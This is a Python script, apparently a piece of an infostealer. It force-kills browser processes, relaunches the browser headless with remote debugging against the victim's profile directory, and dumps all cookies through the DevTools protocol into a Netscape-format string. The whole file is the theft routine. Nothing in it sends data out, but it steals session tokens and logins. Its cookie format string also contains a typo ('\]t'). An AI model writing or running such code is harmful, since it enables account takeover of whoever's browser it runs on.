import requests
import websocket
import json
import subprocess
import os
import psutil

DEBUG_PORT = 9222
DEBUG_URL = f'http://localhost:{DEBUG_PORT}/json'
PROGRAM_FILES = os.getenv('programfiles')


def get_debug_ws_url():
    res = requests.get(DEBUG_URL)
    data = res.json()
    return data[0]['webSocketDebuggerUrl'].strip()

def check_and_close_browser(browser_name):
    for process in psutil.process_iter(['pid', 'name', 'username']):
        if browser_name.lower() in process.info['name'].lower():
            try:
                os.kill(process.info['pid'], 9)
            except PermissionError:
                print(f"You don't have permission to close {browser_name}.")
            except Exception as e:
                print(
                    f"Oops, something went wrong when trying to close {browser_name}. Details: {str(e)}")


def start_browser(bin_path, user_data_path, profile='Default'):
    subprocess.Popen([bin_path, '--restore-last-session', f'--remote-debugging-port={DEBUG_PORT}', '--remote-allow-origins=*', '--headless', f'--user-data-dir={user_data_path}',
                      f'--profile-directory={profile}'
                      ], stdout=subprocess.DEVNULL)


def get_all_cookies(ws_url):
    ws = websocket.create_connection(ws_url)
    ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
    response = ws.recv()
    response = json.loads(response)
    cookies = response['result']['cookies']
    ws.close()
    return cookies


def get_cookies(path: str, profile: str, bin: str, browser_name: str):
    try:
        start_browser(bin, path, profile)
        ws_url = get_debug_ws_url()
        cookies = get_all_cookies(ws_url)
        check_and_close_browser(browser_name)
        cookie_string = "\n".join(
            f"{cookie['domain']}\t{cookie['secure']}\t{cookie['path']}]t{cookie["httpOnly"]}\t{cookie['expires']}\t{cookie['name']}\t{cookie['value']}"
            for cookie in cookies
        )
        return cookie_string
    except Exception as e:
        print(f"Error getting cookies: {e}")
        pass
